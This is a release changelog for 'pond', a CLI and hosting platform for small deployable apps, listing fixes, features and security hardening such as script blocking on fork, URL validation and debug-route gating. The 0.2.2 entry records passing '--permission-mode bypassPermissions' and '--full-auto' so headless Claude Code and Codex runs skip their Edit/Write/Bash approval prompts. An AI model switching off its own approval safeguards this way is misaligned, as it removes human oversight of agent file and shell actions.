- **IDE diagnostics tile no longer lies about whether a deploy was built.** Opening `/ide/<deployId>` on an already-deployed project (for example after a page reload, or arriving from `pond claim`'s "IDE:" link) always showed `No build yet. Hit Deploy to compile.` — even with the live preview rendering the running app directly below it. Root cause: `lastBuild` in `src/ide/App.tsx` was purely in-tab React state initialized to `null`; the IDE never asked the server "is there already a current bundle?". On the server side, `bundleBytes` and `bundleHash` were returned by the three build handlers but never written to the persisted `HostedDeployRecord`, so the bootstrap couldn't have surfaced them anyway. Fixed end-to-end: four new fields persisted on the record (`bundleBytes`, `bundleHash`, `lastBuiltAt`, `lastBuildDurationMs`), written from all three build paths (`POST /api/deploys`, `PUT /api/deploys/:id`, `POST /api/deploys/:id/build`); IDE bootstrap (`/ide/:deployId` HTML) now ships a `lastBuild` block in `window.__POND_IDE`; `App.tsx` seeds its `useState<BuildResult>` from that bootstrap so the diagnostics tile renders `✓ Built · 17.4 KB` on first mount. Old records that pre-date these fields ship `lastBuild: null` and the IDE falls back to the previous "No build yet" placeholder — that's honest, not a bug, and self-corrects on the next rebuild.

### Internal

- **`HostedDeployRecord` gains `bundleBytes`, `bundleHash`, `lastBuiltAt`, `lastBuildDurationMs`.** All four are optional so existing records on disk continue to parse cleanly. Same pattern the record already uses for `title` / `description` / `isPublic` (introduced in 0.3.6).
- **Diagnostics tile suppresses `in 0ms` for seeded records.** When `durationMs` is zero (a pre-fields record that has `bundleBytes` but no duration), the tile renders `✓ Built · 17.4 KB` instead of `✓ Built in 0ms · 17.4 KB`. Fresh builds always carry a real duration and render `in 142ms` as before.
- **1 new regression test** in `test/host.test.mjs`: spoofs the Host header to hit the bare-domain `/ide/<deployId>` route on a freshly-created deploy and asserts the bootstrap HTML embeds `lastBuild.{bundleBytes, bundleHash, builtAt, durationMs}` with sensible values (bundleBytes > 0, bundleHash is a 64-char hex string, builtAt non-empty, durationMs ≥ 0). Full suite: 117 tests pass.

## [0.3.7] - 2026-05-27

### Fixed

- **`pond claim` no longer poisons `.pond/deploy.json` with the control plane's bind address.** When pond.run's control plane returns a successful claim response it echoes its internal bind address (`http://0.0.0.0:8787`) in `remote.apiUrl`. 0.3.0–0.3.6 wrote that echoed value back into `.pond/deploy.json` and into `~/.pond/credentials.json` (when `--signup` created a new user via `claim`), breaking every follow-up command that reads `apiUrl` — `pond signup`, `pond dashboard`, `pond env list`, `pond logs`, `pond db`, `pond domains`, and `pond deploy`'s re-upload path all failed with `ECONNREFUSED 0.0.0.0:8787` until the file was hand-edited. `pond deploy` and `pond signup` already had the fix; `pond claim` was missed. The repaired handler now trusts the apiUrl the user actually reached and ignores `remote.apiUrl`, with a comment cross-referencing the sibling commands. The same rule is enforced via a single helper (`readDeployRecord`) so future writers can't drift.
- **`pond inspect`'s friendly "is the capsule running?" hint now fires on dual-stack localhost.** 0.3.5 added a one-line hint when `fetch` failed with `ECONNREFUSED`, but the check only walked `err.cause.code`. Node's undici uses happy-eyeballs against `localhost` (IPv4 + IPv6 in parallel); when both families refuse, `err.cause` is an `AggregateError`, not a single Error with `.code`. The friendly branch was skipped and the raw `internalConnectMultiple` stack still leaked through. Replaced the inline check with `hasErrorCode(err, "ECONNREFUSED")`, a bounded-depth walker that recurses into `err.cause` and `AggregateError.errors[]`. Self-referential cause chains are handled.

### Added

- **Self-heal for `.pond/deploy.json` files corrupted by the 0.3.0–0.3.6 `pond claim` bug.** Users who already ran `pond claim` on a previous version have a poisoned `apiUrl` that won't fix itself just by upgrading. Every reader now goes through `readDeployRecord(cwd)`, which detects the specific corruption signature (apiUrl host in `{0.0.0.0, ::}` AND `url` is a non-loopback public host from which a control plane can be derived by stripping one DNS label) and silently rewrites apiUrl in place, persisting the repair to disk and printing a one-line note (`pond: repaired .pond/deploy.json (apiUrl http://0.0.0.0:8787 → https://pond.run)`). The trigger conditions are narrow enough that legitimate self-hosted setups bound to `0.0.0.0` over a loopback URL are not touched.

### Internal

- **New module `src/host/deploy-record.ts`.** Single source of truth for reading and repairing `.pond/deploy.json`. Exports `readDeployRecord(cwd)`, `healDeployRecord(record)`, `deriveControlPlaneFromDeployUrl(url)`, and `deployRecordPath(cwd)`. Nine commands (`claim`, `signup`, `dashboard`, `env`, `logs`, `db`, `domains`, `deploy`, `inspect`) were converted from inline `JSON.parse(fs.readFileSync(...))` to the helper. Net diff is smaller, not larger.
- **16 new test cases** in `test/deploy-record.test.mjs` covering `deriveControlPlaneFromDeployUrl`, every branch of `healDeployRecord` (positive heal for IPv4/IPv6 sentinels, negative for healthy / loopback / no-parent-zone / missing-field records), `readDeployRecord` persistence/no-op behavior, and `hasErrorCode` for flat causes, AggregateError, miss cases, and self-referential loops. Full suite: 116 tests pass.

## [0.3.6] - 2026-05-27

### Added

- **`pond dashboard` command — opens the per-host project dashboard in your browser.** The dashboard already existed at `<host>/dashboard` (Preact app served by `pond host`, lists every deploy owned by the signed-in user), but no CLI command pointed at it and `pond deploy` never mentioned it, so end users couldn't find it. `pond dashboard` resolves the control-plane URL from `--api`, then `.pond/deploy.json` in cwd, then a single saved credential in `~/.pond/credentials.json`; refuses with a list of `pond dashboard --api …` invocations when multiple credentials are saved. Spawns the platform's URL opener (`open` / `xdg-open` / `start`) detached with stdio ignored, falls back to a printed URL on failure. `--print-url` skips the browser for headless/CI use.
- **`pond deploy`, `pond signup`, `pond claim`, `pond login` now print `Dashboard: <host>/dashboard  (or: pond dashboard)`** on successful non-anonymous flows. Discoverability fix — until now the dashboard URL never appeared in any CLI output, so even users who landed on it didn't know it existed.

### Changed

- **`GET /api/deploys` now returns `title`, `description`, and `isPublic`** for each deploy. These were already on the `HostedDeployRecord` (parsed from `capsule({ title, description, public })` by a regex over `server/index.ts` on each build) but the list endpoint dropped them. Additive change — older dashboard bundles ignore the new fields.
- **Dashboard list rebuilt as project cards led by the capsule title** instead of a hex-id-first table. Each card shows the title (bold), then a single muted subtext line with the deploy URL, short deploy id, and age. Description appears below the subtext when present. Actions ("Open IDE →", "Open live app", "Rotate claim", "Delete") moved to a footer row. Matches the visual reference of a project-name-first dashboard rather than a debug-style listing of opaque IDs. Bundle is still 20.4 KB raw — no size regression.

## [0.3.5] - 2026-05-27

### Fixed

- **`pond inspect` no longer dumps a Node undici stack trace when the capsule isn't running.** Running `pond inspect` immediately after `pond new --generate` (i.e. before `npm install && npm run dev`) previously failed with a raw `TypeError: fetch failed` and a `node:internal/deps/undici/...` traceback because the localhost connection was refused. The command now catches `ECONNREFUSED` from the localhost fetch and exits 1 with a one-line hint: `Could not reach http://localhost:3000 — is the capsule running? Start it with: pond dev   (or: npm run dev)`. Other fetch failures still propagate untouched so real bugs aren't masked. The identical pattern still exists in `pond logs` and `pond db` — those will be cleaned up in a follow-up.

### Docs

- **README images rehosted on a public sibling repo.** The `DevvGwardo/pond` repo is private, so `raw.githubusercontent.com/DevvGwardo/pond/main/docs/branding/*.png` returned 404 to any anonymous viewer — meaning the npm package page, social card previews, and logged-out GitHub all showed broken images. Created `DevvGwardo/pond-assets` (public) containing the 7 branding PNGs and rewrote the README's `<img src=…>` tags to point at `raw.githubusercontent.com/DevvGwardo/pond-assets/main/*.png`. The originals stay in `docs/branding/` of the main repo as the source of truth; only the README links changed.

## [0.3.4] - 2026-05-27

### Changed

- **npm tarball shrunk from ~12.6 MB to ~712 KB** by switching README image references from relative paths (`./docs/branding/*.png`) to absolute GitHub raw URLs and narrowing the `files` array from `docs/` to `docs/*.md` + `docs/*.txt`. The seven branding PNGs were dominating the package size; they now load on the npmjs.com package page from GitHub raw instead of being bundled. Every `npm install pondsh` pulls down ~17× less data. The npm page still renders the imagery (npm fetches the absolute URLs at render time), and the markdown reference docs (`cli-reference.md` et al.) still ship for `pond host`'s `/docs/<slug>.md` agent route.

### Added

- **Live progress feedback during `pond new --generate`.** Previously the CLI printed `Streaming output from <agent>...` and then waited silently until the agent emitted its first byte — which can be 10–30 seconds for hermes/claude/codex booting up. Now on TTYs you see an animated spinner with elapsed time (`⠼ hermes is thinking… 12s`) that clears the moment the first byte arrives and the real streaming output takes over. On completion the CLI prints a summary (`hermes finished in 1m 47s — 4.2 KB streamed`). Falls back to a single `Building with <agent> (this can take 1–3 minutes)…` line on non-TTY runs (CI, pipes) so log output stays clean.
- `streamChild` in `src/detect-agents.ts` now defers to the caller for rendering when `onChunk` is provided (the heartbeat above needs to coordinate stdout). Callers that don't pass `onChunk` keep the previous direct-to-stdout behavior.

## [0.3.3] - 2026-05-27

### Fixed

- **`prepare` script no longer crashes production installs.** 0.3.2 added `"prepare": "husky"` for the dev pre-commit hook. The `prepare` lifecycle runs on every `npm install`/`npm ci` for the package itself, including `npm ci --omit=dev` in the Dockerfile and any from-source build. Husky is a devDep, so when devDeps are omitted, `husky` isn't on PATH and the prepare script fails with `sh: 1: husky: not found` (npm error 127) — taking down the entire install. The fix is the canonical husky-9 pattern: `"prepare": "husky || true"`. The `|| true` lets prepare no-op when husky isn't installed (production) while still setting up hooks when it is (development). Discovered the hard way during the upgrade of pond.run — the 0.3.2 Docker build failed, and the running site was down for several minutes.

### Internal

- **`deploy/upgrade.sh` fails fast if tunnel config is missing.** New preflight check refuses to start if `deploy/.env`, `deploy/cloudflared/config.yml`, or `deploy/cloudflared/credentials.json` is absent. These are gitignored secrets — losing them mid-upgrade puts the stack into a `cloudflared` crash loop and the public domain returns Cloudflare error 1033. Failing before `docker compose down` keeps the running stack up while the operator restores the missing files. Same incident discovery as the husky fix.
- **`deploy/README.md` gains a "Tunnel config recovery" section** documenting how to rebuild `config.yml` + `credentials.json` from scratch — including the non-obvious bit that the credentials file needs `chmod 644` because the `cloudflared` container runs as a non-root user.

## [0.3.2] - 2026-05-27

### Added

- **`pond signup <username>` — friendly first-account flow.** The previous "create an account on pond.run" path was `pond claim --signup <username>`, hidden under a command name (`claim`) that sounds like ownership transfer, not account creation. New users typed `pond login` instead, hit confusing errors, and bounced. `pond signup` is a one-line wrapper that reads `.pond/deploy.json` from the cwd, calls the same claim endpoint with the signup payload, and saves the resulting token to `~/.pond/credentials.json`. The three-command first-run is now: `pond new my-app`, `pond deploy`, `pond signup torrey`. If there's no `.pond/deploy.json`, signup refuses with a hint pointing at `pond deploy` — signup without an attached deploy is intentionally not supported (it would create a dangling account).
- The anonymous-deploy success message now prints `Claim with: pond signup <username>` (with `pond claim --signup` listed as the alias) instead of the previous `pond claim` + `pond login --api … --username … --token …` two-line incantation.

### Changed

- **`pond login --api` defaults to `https://pond.run`** (matching `pond deploy` since 0.3.0). Most users want the public host; making them retype it on every login is friction.
- **`pond login` catches the empty-`--api` footgun.** Citty (like most arg parsers) will consume the next token as a flag's value, even if it starts with `--`. So `pond login --api --username your-username` silently assigned `--username` as the api URL and then failed trying to reach a control plane named "--username". `pond login` now detects values that start with `--` (or that are empty) and errors out with a clear explanation pointing at the simpler `--token`-based command form.
- **`pond login` error message when no token / no bootstrap credentials are available** now lists three concrete next steps (signup, attach existing token, self-hosted bootstrap) instead of just complaining about missing `--admin-token` / `POND_HOST_TOKEN`. Half the people hitting this error want option 1.

### Internal

- **Husky + lint-staged pre-commit hook running `prettier --write` on staged files.** The 0.3.0 and 0.3.1 releases failed CI on formatting — `prepublishOnly` only runs `build`, not `format:check`, so the package shipped fine, but `main` was red. The pre-commit hook prevents this from recurring. Activates after `npm install` via the `prepare` script (husky no-ops for downstream npm installs of `pondsh`).

## [0.3.1] - 2026-05-27

### Added

- **Human-readable docs site at `pond.run/docs`.** The five reference docs (`cli-reference`, `api-reference`, `client-reference`, `mcp`, `operations`) used to be served only as raw `text/markdown` — perfect for the agent flow (Claude/Cursor fetch them as plain text), useless if you opened one in a browser. `pond host` now serves them as rendered HTML too: `/docs` is a curated index, `/docs/<slug>` renders the markdown with sidebar navigation, anchored headings (so `/docs/cli-reference#pond-deploy` deep-links), styled code blocks, GFM tables, and brand-consistent dark styling that matches the 0.3.0 design language (black background, mono accents, no rounded corners, no rainbow syntax-highlighting). The existing `/docs/<slug>.md` route is unchanged — agents and `llms.txt` keep working exactly as before. Markdown parsing is via the `marked` library; rendering is server-side, no JS framework, no client-side hydration.
- The landing page "Docs" link now points to `/docs` instead of GitHub. A separate "GitHub" link is added next to it.

### Changed

- **`docs/cli-reference.md` brought up to date for 0.3.0.** The `pond deploy` and `pond fork` sections were last revised in 0.2.7 and described the old behavior — local-by-default `pond deploy`, no `--local`, no `--allow-scripts`, fork using a `--dir` flag that was actually named `--name`. Now reflects the actual CLI surface as of 0.3.0.

## [0.3.0] - 2026-05-27

### Changed

- **Templates ship raw Tailwind, not a built-in component system.** The dark-mode CSS variables (`--bg`/`--fg`/`--border`/...) and opt-in classes (`.btn`/`.card`/`.input`/`.label`/`.kbd`/`.divider`) added in 0.2.5 are gone from the bundler's HTML shell. Every capsule landed on the same `bg-zinc-950` + card-stack look — the "instant polish" became "instant AI-default." The bundler now ships a minimal safety net (`* { box-sizing: border-box }`) and lets each template own its visual identity. The capsule contract in AGENTS.md / `.claude/CLAUDE.md` / `.cursor/rules/pond.mdc` flips from "prefer these classes" to a list of AI-default patterns to actively avoid (`bg-zinc-950` card stacks, white-pill buttons, `text-2xl` page titles, universal `rounded-lg`) plus a "one signature move per capsule" rule. All five templates (`todo`, `chat`, `feed`, `crud`, `dashboard`) were rewritten to demonstrate the new aesthetic: display headings, mono accents on machine-flavored text (timestamps, indices, source tags), wireframe or brand-colored buttons, `divide-y` row lists instead of card-per-item. **This changes how every freshly-scaffolded capsule looks** — existing capsules are unaffected (the CSS only applied to the bundler-generated HTML shell, which is regenerated per-deploy).
- **`pond deploy` defaults to hosted (`https://pond.run`).** Previously, bare `pond deploy` wrote a local bundle to `.pond/deploy-bundle.mjs` and exited — which contradicted the package's own marketing ("Hosted Lakebed-style anonymous deploys included") and made the one-command first-run flow impossible. Now `pond deploy` with no args uploads an anonymous deploy to `https://pond.run` and prints the live URL + claim token + IDE URL. The CLI prints `→ No deploy target set; uploading to https://pond.run (anonymous). Pass --local to build offline instead.` before the upload so the behavior isn't invisible. **This is a behavior change**: if you previously relied on `pond deploy` producing a local bundle (CI, airgapped, self-hosted shipping), pass `--local` (see below). `pond deploy --api <url>` is unchanged for self-hosted control planes.
- **Smart redeploy.** When `.pond/deploy.json` already records an `apiUrl` from a prior hosted deploy, plain `pond deploy` redeploys to that same control plane instead of defaulting to `pond.run`. No more "where did this deploy go?" surprises after switching between hosted control planes.
- **Printed IDE / management URLs trust the CLI's known `apiUrl`, not the server's echoed `remote.apiUrl`.** Some control planes (incl. current `pond.run`) echo their internal bind address back in the response body (e.g. `http://0.0.0.0:8787`), which made every printed `IDE:` / `Manage env with:` line unusable. The CLI now uses the address it actually deployed to. Same fix on the `apiUrl` field saved to `.pond/deploy.json`.

### Added

- **`pond deploy --local`.** Explicit opt-in for the old offline-bundle behavior — builds `.pond/deploy-bundle.mjs` + `.pond/deploy.json` without uploading. Use for airgapped/self-host scenarios where you ship the bundle yourself with `pond start`.

### Security

- **`pond fork` no longer auto-runs upstream lifecycle scripts.** A hostile or compromised public capsule could ship a `package.json` whose `postinstall` script is arbitrary shell — and the CLI's "next step" message tells the user to run `npm install` three lines later. `pond fork` now refuses to write any `package.json` containing `preinstall`/`install`/`postinstall`/`prepare`/`postprepare` unless the user passes `--allow-scripts`. The refusal message names the offending scripts.
- **`pond fork` validates the control-plane URL it derives.** Previously, pasting any `<id>.evil.com` URL into `pond fork` would route the source download through `evil.com` (the CLI silently stripped the deploy subdomain and used the rest as the API base). Now: when the API base is _derived_ from a pasted deploy URL, only `pond.run` and `*.pond.run` are accepted; anything else requires an explicit `--api` opt-in. Plain `http://` is refused for non-loopback hosts.
- **Dev server `/__pond/*` debug routes are gated by Origin + Host checks.** The dev server's debug surface (`/__pond/db/tables`, `/__pond/db/dump/:table`, `/__pond/inspect`, `/__pond/logs`, `/__pond/auth/guest`) was reachable from any browser tab on the machine — wide-open `cors()` made the responses readable cross-origin, and DNS rebinding could bypass the loopback bind. A new middleware on `/__pond/*` rejects requests whose `Origin` is set and cross-origin, or whose `Host` header isn't `127.0.0.1:<port>` / `localhost:<port>` / `[::1]:<port>`. User-defined routes on the dev server are unchanged.

### Fixed

- **`pond claim` no longer drops `0o600` on `.pond/deploy.json`.** `pond deploy` writes the file at mode `0o600` (it contains the claim token); `pond claim` rewrote the same file with default umask, undoing the protection on every claim. Now matches `deploy.ts`.

## [0.2.11] - 2026-05-27

### Changed

- **README Quickstart leads with `npx pondsh new …`.** Following the 0.2.8 `pondsh` bin alias and the 0.2.10 hoisting fix, the canonical run-without-install command (`npx pondsh new my-capsule`) actually works on a clean machine — surface it as the primary path. Global install via `npm install -g pondsh` is still documented but moved below. The `--generate` example uses the npx form too and shows what the flag does (invokes the local agent headlessly) instead of just demoing the stub-scaffold path.

## [0.2.10] - 2026-05-27

### Fixed

- **Client bundler resolves `preact` regardless of npm hoisting.** `buildClient` in `src/bundler.ts` aliased `preact`, `preact/hooks`, and `preact/jsx-runtime` to `path.resolve(import.meta.dirname, "../node_modules/preact/...")` — that path only resolves when preact is nested under `pondsh/node_modules`, which modern npm doesn't do because it hoists peers up to the consumer's root `node_modules`. Every fresh `npm install pondsh` produced `ERROR: Could not resolve "...pondsh/node_modules/preact/dist/preact.module.js"` on first `pond dev`. Now uses `createRequire(import.meta.url).resolve("preact/package.json")` to find preact wherever Node's module resolution puts it (root, nested, pnpm symlinks, all fine).

## [0.2.9] - 2026-05-27

### Fixed

- **`boolean()` columns no longer crash mutations.** `buildDbProxy.insert` / `.update` forwarded JS `true` / `false` straight to better-sqlite3, which rejects boolean bindings with `SQLite3 can only bind numbers, strings, bigints, buffers, and null` — so every `--generate`d capsule with a `boolean()` column 500'd on the first mutation. The runtime now coerces booleans to `1` / `0` at the binding boundary. Backfilled `test/runtime-features.test.mjs` with an end-to-end roundtrip (the previous boolean test only created the column and never inserted into it, which is how the bug shipped).

## [0.2.8] - 2026-05-27

### Added

- **`pondsh` bin alias.** `npx pondsh@<v> pond new …` (without the `-p` flag) now works. Previously npx interpreted `pondsh` as the binary name, found no match (the bin was just `pond`), and failed with `could not determine executable to run`. Both `npx pondsh new …` and the older `npx -p pondsh pond new …` form route through the same CLI entry.

## [0.2.7] - 2026-05-27

### Changed

- **Hermes integration switched from HTTP probe to CLI spawn.** Previously `pond new --generate` probed `127.0.0.1:8642/v1/models` for an OpenAI-compatible endpoint and, on failure, tried to start one with `hermes-agent serve` — but `hermes-agent` is a chat REPL shim that silently ignores `serve` and runs a hard-coded demo query, so the start path always timed out after 15s. The real CLI is `hermes` with a `-z "<prompt>"` one-shot flag, mirroring `claude -p` and `codex exec`. `detectHermes` now does `which("hermes")`; `invokeHermes` spawns `hermes -z <prompt>` and streams stdout. No HTTP, no auth wiring, no gateway-start dance.
- Removed `detectHermesInstall`, `startHermesGateway`, and `promptYesNo` from `src/detect-agents.ts` (the prompt block in `pond new --generate` that asked "Start it now and use it for --generate?" is gone — the whole flow it gated never worked).
- Removed the `POND_HERMES_START_ARGS` env var — it overrode a verb on a binary that didn't accept any verb.

### Added

- **`docs/cli-reference.md`** — full CLI reference covering every `pond` subcommand (`new`, `dev`, `deploy`, `host`, `db`, `logs`, `inspect`, `fork`, `claim`, `login`, `user`, `token`, `domains`, `env`, `auth`) with when-to-use, key flags, and worked examples. Served at `https://pond.run/docs/cli-reference.md`, registered in `llms.txt`, and concatenated into `llms-full.txt`.

## [0.2.6] - 2026-05-27

### Fixed

- **`pond host` sandbox boot on Node 24.** Node 24 removed the `--experimental-permission` flag (renamed to `--permission` in Node 23, stable). `forkDeploy` was hard-coding the experimental form, so forked workers exited with `code=9 (bad option)` before booting and every sandboxed/anonymous deploy failed. Now selects `--permission` for Node 23+ and keeps `--experimental-permission` for Node 22 LTS. CI's Node 24 matrix lane is green again.

## [0.2.5] - 2026-05-27

### Fixed

- **Void mutations no longer crash the client.** `apiFetch` in `pond/client` was unconditionally calling `res.json()` on every response, which threw `SyntaxError: Unexpected end of JSON input` for mutations that return `void` (empty body). Now reads `text()` first and only parses when non-empty. Affected every generated app that called a void mutation (e.g. `addItem`, `deleteItem`).
- **`pond dev` falls back when the port is taken.** Previously, anything squatting on port 3000 caused `EADDRINUSE` and a hard crash. Now probes the requested port (default 3000) and walks forward up to 20 ports, logging `port 3000 in use — using 3001 instead` when it shifts.

### Changed

- **Built-in design system.** The HTML shell generated by `pond/bundler` now ships CSS variables (`--bg`, `--bg-elev`, `--fg`, `--fg-muted`, `--fg-subtle`, `--border`, `--accent`, `--danger`, `--success`, `--radius`, `--radius-sm`, `--radius-lg`) and opt-in component classes — `btn` (+ `-primary` / `-secondary` / `-ghost` / `-danger`), `card`, `input`, `textarea`, `select`, `label`, `kbd`, `divider` — for a consistent shadcn-dark baseline across `pond dev`, `pond deploy`, and `pond host`. The capsule contract in `AGENTS.md` / `.claude/CLAUDE.md` now teaches the agent to prefer these classes for instant polish and override with Tailwind utilities when needed.

## [0.2.4] - 2026-05-27

### Changed

- **`pond new "<prompt>" --generate` no longer scaffolds a template.** With `--generate`, the user's prompt drives 100% of the app instead of "todo template + agent overlay" — the scaffold writes a minimal blank-canvas stub (empty capsule, placeholder UI) and lets the agent design schema, queries, mutations, and UI from scratch. The CLI output reads `Created my-app/ (stub scaffold — agent will design from your prompt)` instead of the misleading `(template: todo)`. Pass `--template <name>` to opt back into the template path even with `--generate`.
- **Broadened the `todo` template's keyword set** (`tracker`, `habit`, `journal`, `expense`, `weight`, `mood`) so prompts like "habit tracker" or "expense log" lock onto todo via the heuristic without falling through to the silent default. This only matters when `--generate` is _not_ set, since `--generate` skips the heuristic entirely.

### Added

- **Interactive hermes-agent startup.** When `pond new --generate` runs on a TTY and finds the hermes-agent binary or config dir but the gateway is down, the CLI now asks `Start it now and use it for --generate? [Y/n]`. On `yes`, pond spawns `<binary> serve` (override via `POND_HERMES_START_ARGS`) detached with stdio piped to a log under `$TMPDIR`, polls `/v1/models` every 300 ms for up to 15 s, then prepends hermes to the cascade if the gateway comes up. Non-TTY runs are unchanged (deterministic, no prompt).
- `startHermesGateway()` and `promptYesNo()` exports in `src/detect-agents.ts` for the above.

### Fixed

- The previous `0.2.3` hint-only behavior is replaced by the interactive flow above. (0.2.3 was tagged but never published to npm, so this release supersedes it.)

## [0.2.3] - 2026-05-27

### Added

- **Hermes "installed but not running" hint.** `pond new` now looks for a `hermes-agent` binary on PATH or a `~/.hermes-agent` / `~/.config/hermes-agent` config dir even when the gateway isn't listening on 127.0.0.1:8642. If it finds one, the CLI prints a short hint suggesting the user start the gateway (e.g. `hermes-agent serve`) so hermes can lead the cascade instead of silently deferring to claude/codex.

## [0.2.2] - 2026-05-27

### Fixed

- **`pond new --generate`** previously hung against Claude Code / Codex CLI because the headless `-p` / `exec` modes still gated Edit, Write, and Bash on an interactive approval that no one was watching. Now passes `--permission-mode bypassPermissions` (Claude) and `--full-auto` (Codex) so the headless invocation can actually write the files it was asked to write.

## [0.2.1] - 2026-05-27

### Fixed

- **`pond new --generate`**: when the first detected agent fails (e.g. hermes returns an unauthenticated response or the model is unloaded), the CLI now falls through to the next candidate in the cascade instead of bailing. The AGENTS.md still survives a total failure for retry.
- **Hermes detection**: a `401` from `127.0.0.1:8642/v1/models` no longer counts as "alive" — that indicates an unusable instance, so the cascade skips straight to `claude` / `codex`.

## [0.2.0] - 2026-05-27

A capability + ergonomics release. New capsule primitives (`ctx.ai`, `ctx.blob`, `socket()`, per-route `rateLimit`), additional auth providers, a template library, IDE polish, an MCP server, and a per-user `/dashboard`.

### Added

- **`ctx.ai`** — built-in LLM primitive. Routes to Anthropic / OpenAI / a local Hermes-compatible endpoint based on which key is set; `complete()` + `stream()`.
- **`ctx.blob`** — per-deploy key/value blob store. `put/get/delete/list` with metadata mirrored in `_pond_blobs`; readable at `/api/blob/:key`.
- **`socket()`** — WebSocket handlers on capsules. Mounted at `/api/socket/<name>`. Host control plane proxies the HTTP Upgrade through a raw TCP pipe; dev server has a hot-reload-aware upgrade handler.
- **Per-route rate limits** — `capsule({ rateLimit: { addItem: { perMinute: 60, by: "user" } } })`. Over-limit requests get `429 Rate limited` with `Retry-After`.
- **`/__pond/metrics`** — Prometheus text format. `pond_route_requests_total`, `pond_route_errors_total`, `pond_route_duration_ms` (p50/p95/p99 over a rolling 500-sample window).
- **Additive schema migrations** — new tables auto-created, new columns auto-added via `ALTER TABLE`. Destructive changes (column drops) raise a clear error instead of silently breaking the deploy.
- **GitHub OAuth** + **email magic links** — alongside the existing Google OAuth. Magic-link tokens land in `_pond_magic_links`; the runtime emits via Resend when `RESEND_API_KEY` + `EMAIL_FROM` are set, otherwise logs the link.
- **`pond new --generate`** — detects a locally running agent (hermes → claude CLI → codex CLI) and streams its output to scaffold the capsule from the prompt. Detection happens on every `pond new`; invocation is opt-in.
- **Template registry** — `pond new --list-templates` enumerates six templates: `todo`, `auth-app`, `blog`, `chat`, `dashboard`, `webhook-handler`. Without `--template`, prompt-based heuristic picks the closest match.
- **`pond fork <url-or-id>`** — pulls source from a public deploy and scaffolds a local copy ready for `pond dev`.
- **`/gallery`** at the bare host — lists capsules opted-in via `capsule({ public: true, title, description })`. Includes copy-as-`pond fork` button.
- **`/dashboard` SPA** — per-user view of deploys with rotate-claim, rotate-user-token, delete, and open-IDE actions. Token-gated; reuses existing control-plane endpoints.
- **`pond-mcp`** — Model Context Protocol server bin. Eight tools (`list_deploys`, `deploy_files`, `read_file`, `write_file`, `build_deploy`, `tail_logs`, `env_list`, `env_set`). `claude mcp add pond pond-mcp` and Claude Code can manage capsules natively. See `docs/mcp.md`.
- **IDE polish** — streaming logs pane (SSE, pause-on-hover, level filter), env editor (masked values, add/edit/delete, rebuild on save), command palette (Cmd/Ctrl-K), global file search (Cmd/Ctrl-Shift-F), pre-deploy side-by-side diff modal.
- **`pond db backup`** + **`pond db restore`** — local snapshots via `VACUUM INTO`; restore stages to `.pond/data.db.restored` for a post-stop swap.
- **`.cursor/rules`** + **`.claude/CLAUDE.md`** in every scaffold — agents opening a fresh capsule pick up the contract immediately.

### Changed

- CI matrix bumped: `actions/checkout@v5`, `actions/setup-node@v5`, Node 20/22/**24**.
- `_pond_users` schema gained a `githubId` column; lightweight migration runs on boot for older DBs.

### Dependencies

- Added `ws` (^8.21.0).

## [0.1.0] - 2026-05-26

First public release. Tagged after a security-hardening pass on the alpha.

### Added

- **Hosted control plane** (`pond host`): anonymous + authenticated deploys, custom subdomains, claim tokens, per-deploy quotas, Node 22 `--experimental-permission` sandbox for anonymous workers.
- **`--public-base-url`** flag — control plane returns external URLs (`https://abc.pond.example.com`) instead of `http://localhost:port`.
- **`--abuse-email`** flag — populates abuse policy + security.txt contact.
- **Landing / abuse / security.txt routes** at the bare external domain.
- **Audit log** (`GET /api/audit`, admin-only) tracking every mutation: user.create, user.rotate_token, deploy.{create, update, delete, claim, rotate_claim_token, quota_update, env_update, env_delete}, domain.{add, remove}.
- **Persistent per-IP anonymous rate limit** — survives host restart (was in-memory).
- **Token rotation grace window** — previous token authenticates for 5 minutes after rotate, so in-flight clients can swap.
- **env caps** — 64 KB total, 256 entries, 1024 chars per value (was unbounded).
- **`pond/client` SDK** (`useQuery`, `useMutation`, `useAuth`, `SignInWithGoogle`, `signOut`) — was a stub.
- **Reserved-identifier denylist** — SQLite keywords, `_pond_` prefix, 64-char cap on schema names.
- **Deployment kit** in `deploy/` — Dockerfile, docker-compose, systemd unit, cloudflared config template.
- **Operations guide** at `docs/operations.md` — full Lakebed-style launch runbook.
- **API references** at `docs/api-reference.md` (server) and `docs/client-reference.md` (client).
- **CLI integration tests** (`test/cli.test.mjs`) covering `new`, `dev`, `deploy`, `start`.

### Changed

- `pond dev` binds to `127.0.0.1` only (was all interfaces). `/__pond/auth/guest` validates input.
- `.pond/deploy.json` written with mode 0600 (was world-readable; contains claim token).
- `pond deploy --api http://<non-loopback>` prints a stderr warning about plaintext credentials.
- Dev-server file watcher is trailing-edge debounced (200 ms).
- `pond new`: the boolean flag is now `git` (default true). Pass `--no-git` to skip (citty's natural negation).
- Repository is prettier-formatted; CI gates on `npm run format:check`.

### Fixed

- B1: malformed JSON on POST/PUT `/api/deploys` returns 400 instead of 500.
- B2: anonymous workers cannot use `node:http` / `node:https` / `tls.connect` (net.Socket shim).
- B4: PUT `/api/deploys/:id/quota` with empty body returns 400 instead of silent 200.
- B5: per-user custom-domain quota (50) prevents domain-table DoS.
- B6: 16-char hex deploy ID routing rule no longer overlaps with 8-char custom subdomains.
- Anonymous deploy boot failure rolls back disk + DB rows (no leaked deploy dirs).

### Known limitations

- JS-level network shim is not airtight (no DNS-layer block, no protection against native modules). Combine with OS egress firewall for hostile-tenant hosting.
- Single-instance control plane (SQLite, no horizontal scaling).
- No payments / paid tier.
- `dns.lookup` from anonymous workers is not blocked; DNS exfiltration remains possible at the JS layer (commit 6297160 documents the rationale).
